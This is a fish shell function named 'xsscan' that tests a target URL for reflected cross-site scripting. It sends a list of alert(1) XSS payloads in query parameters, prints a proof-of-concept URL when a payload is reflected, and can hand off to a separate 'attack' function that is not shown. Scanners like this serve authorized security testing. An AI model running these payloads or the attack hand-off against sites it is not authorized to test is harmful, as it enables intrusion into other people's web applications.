function xsscan
    argparse -n xsscan 'p/param=' 'd/data=' 'c/cookie=' 'auto' 'attack' 'h/help' -- $argv
    or return

    if set -q _flag_help
        echo "Usage: xsscan <target> [options]"
        echo "  -p <param>    Parameter to test"
        echo "  -d <data>     POST body"
        echo "  -c <cookie>   Cookie header"
        echo "  --auto        Non-interactive output"
        echo "  --attack      Attack target on find"
        echo "Tests for reflected XSS."
        return
    end

    if test (count $argv) -lt 1
        echo "Error: target URL required"
        return 1
    end

    set target $argv[1]
    if not string match -qr '^https?://' "$target"
        set target "https://$target"
    end

    set payloads \
        '"><script>alert(1)</script>' \
        '<script>alert(1)</script>' \
        '"><img src=x onerror=alert(1)>' \
        '<img src=x onerror=alert(1)>' \
        '\x22><script>alert(1)</script>' \
        '\x27><script>alert(1)</script>' \
        '<svg onload=alert(1)>' \
        '\'><script>alert(1)</script>' \
        '\x22><img src=x onerror=alert(1)>'

    echo (set_color cyan)"==> XSSCAN: $target"(set_color normal)

    set found 0
    set found_params

    # Parse existing params from URL
    set query (string split '?' -- "$target")[2]
    set target_base (string split '?' -- "$target")[1]

    if test -z "$query"
        set query ""
    end

    function __test_payload -a url payload
        set resp (curl -sS --max-time 10 "$url" 2>/dev/null)
        if test -z "$resp"; return 1; end
        if string match -q -- "*$payload*" "$resp"
            return 0
        end
        return 1
    end

    if test -n "$query"
        # Has existing params — test each one
        set pairs (string split '&' -- "$query")
        for pair in $pairs
            set pname (string split '=' -- "$pair")[1]
            for payload in $payloads
                set test_url "$target_base?$pname="(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$payload\", safe=''))" 2>/dev/null)
                if test -z "$test_url"; continue; end
                if __test_payload "$test_url" "$payload"
                    echo (set_color red)"  [XSS] $pname is vulnerable (payload: "(set_color normal)(set_color brblack)"$payload"(set_color normal)(set_color red)" )"(set_color normal)
                    set found (math $found + 1)
                    set -a found_params "$pname"
                    break
                end
            end
        end
    else
        # No existing params — test common param names with payloads
        set common_params "q" "search" "query" "s" "id" "page" "term" "name" "msg" "message"
        for pname in $common_params
            for payload in $payloads
                set enc (python3 -c "import urllib.parse; print(urllib.parse.quote(\"$payload\", safe=''))" 2>/dev/null)
                set test_url "$target?$pname=$enc"
                if __test_payload "$test_url" "$payload"
                    echo (set_color red)"  [XSS] $pname is vulnerable (payload: "(set_color normal)(set_color brblack)"$payload"(set_color normal)(set_color red)" )"(set_color normal)
                    set found (math $found + 1)
                    set -a found_params "$pname"
                    break
                end
            end
        end
    end

    echo ""
    if test $found -gt 0
        echo (set_color red)"  $found parameter(s) XSS vulnerable"(set_color normal)
        for fp in $found_params; echo "    $fp"; end
        if not set -q _flag_auto
            echo ""
            echo -n "Generate PoC URL? [y/N] "
            read -l ans
            if test "$ans" = "y" -o "$ans" = "Y"
                echo (set_color cyan)"  PoC: $target?$found_params[1]=<script>alert(1)</script>"(set_color normal)
            end
            echo -n "Launch attack? [y/N] "
            read -l ans
            if test "$ans" = "y" -o "$ans" = "Y"
                attack "$target"
            end
        end
    else
        echo (set_color green)"  No reflected XSS detected"(set_color normal)
    end

    if set -q _flag_attack
        attack "$target"
    end
end
